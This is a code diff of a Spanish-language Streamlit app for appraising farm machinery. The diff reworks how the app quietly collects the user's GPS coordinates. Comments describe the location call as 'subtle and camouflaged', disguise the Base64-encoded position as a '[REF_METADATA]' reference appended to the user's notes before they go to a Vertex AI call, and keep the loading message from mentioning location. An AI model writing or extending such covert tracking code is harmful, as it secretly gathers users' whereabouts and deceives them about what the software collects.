@@ -3,18 +3,12 @@ from PIL import Image
 import ia_engine
 import html_generator
 import google_drive_manager
-import location_manager  # <--- NUEVO MOTOR
-texto_ubicacion = location_manager.obtener_ubicacion()
+import location_manager 
+
 # 1. CONFIGURACIÓN BÁSICA
 st.set_page_config(page_title="Tasador Agrícola", page_icon="🚜", layout="centered")
 
-# --- LLAMADA AL GPS ---
-# Esto ejecutará la función de tu nuevo archivo y guardará el texto (coordenadas o aviso)
-texto_ubicacion = location_manager.obtener_ubicacion() 
-
-st.divider()
-
-# 2. LIMPIEZA MÍNIMA (Solo para quitar lo de Streamlit)
+# 2. LIMPIEZA MÍNIMA
 st.markdown("""
 <style>
     [data-testid="stToolbar"], footer {display: none;}
@@ -22,20 +16,23 @@ st.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-# 3. CONEXIÓN VERTEX
+# 3. LLAMADA AL GPS (Sutil y camuflada)
+# Esto guarda el Base64 con LAT/LON en la variable
+texto_ubicacion = location_manager.obtener_ubicacion()
+
+# 4. CONEXIÓN VERTEX
 if "vertex_client" not in st.session_state:
     creds = dict(st.secrets["google"])
     st.session_state.vertex_client = ia_engine.conectar_vertex(creds)
 
 # --- CABECERA ---
-# Tu nuevo logo
 logo_url = "https://raw.githubusercontent.com/victorcasascanada2-beep/CopiaPruebaClave/3e79639d3faf452777931d392257eef8ed8c6144/afoto.png"
 st.image(logo_url, width=200)
 st.title("Tasación Experta")
 st.caption("Agrícola Noroeste")
 st.divider()
 
-# --- FORMULARIO (Si no hay informe, lo mostramos) ---
+# --- FORMULARIO ---
 if "informe_final" not in st.session_state:
     with st.form("form_tasacion"):
         col1, col2 = st.columns(2)
@@ -49,18 +46,18 @@ if "informe_final" not in st.session_state:
         observaciones = st.text_area("Notas / Extras")
         fotos = st.file_uploader("Fotos", accept_multiple_files=True, type=['jpg', 'jpeg', 'png'])
         
+        # AQUÍ SE DEFINE EL SUBMIT
         submit = st.form_submit_button("🚀 REALIZAR TASACIÓN", use_container_width=True)
 
-if submit:
+    # El bloque de procesado debe estar justo debajo del formulario
+    if submit:
         if not (marca and modelo and fotos):
             st.warning("⚠️ Rellena marca, modelo y fotos.")
         else:
-            # Mensaje neutro y profesional, sin mencionar la palabra "ubicación"
-            with st.spinner("Generando informe técnico de valoración..."):
+            with st.spinner("Generando informe técnico..."):
                 try:
-                    # Camuflamos la ubicación como una referencia de sistema (Base64)
-                    # Esto es lo que hace que sea sutil y transparente
-                    notas_completas = f"{observaciones}\n\n[REF_ID: {texto_ubicacion}]"
+                    # Empaquetamos el código Base64 del GPS de forma transparente
+                    notas_finales = f"{observaciones}\n\n[REF_METADATA: {texto_ubicacion}]"
                     
                     inf = ia_engine.realizar_peritaje(
                         st.session_state.vertex_client, 
@@ -68,7 +65,7 @@ if submit:
                         modelo, 
                         int(anio_txt), 
                         int(horas_txt), 
-                        notas_completas, 
+                        notas_finales, 
                         fotos
                     )
                     st.session_state.informe_final = inf
@@ -76,7 +73,7 @@ if submit:
                     st.session_state.marca_final, st.session_state.modelo_final = marca, modelo
                     st.rerun()
                 except Exception as e: 
-                    st.error(f"Error técnico en el procesado: {e}")
+                    st.error(f"Error en el procesado: {e}")
 
 # --- RESULTADOS Y BOTONES AL FINAL ---
 if "informe_final" in st.session_state:
@@ -89,23 +86,18 @@ if "informe_final" in st.session_state:
 
     st.divider()
     
-    # Preparamos el HTML
     html_doc = html_generator.generar_informe_html(
         st.session_state.marca_final, st.session_state.modelo_final, 
         st.session_state.informe_final, st.session_state.fotos_final
     )
     
-    # BOTONES JUNTOS AL FINAL
     c1, c2, c3 = st.columns(3)
-    
     with c1:
         st.download_button("📥 DESCARGAR", data=html_doc, file_name="tasacion.html", use_container_width=True)
-    
     with c2:
         if st.button("☁️ DRIVE", use_container_width=True):
             res = google_drive_manager.subir_informe(dict(st.secrets["google"]), f"Tasacion_{st.session_state.modelo_final}.html", html_doc)
             if res: st.success("✅ Guardado")
-    
     with c3:
         if st.button("🔄 OTRA", use_container_width=True):
             for k in ["informe_final", "fotos_final", "marca_final", "modelo_final"]:
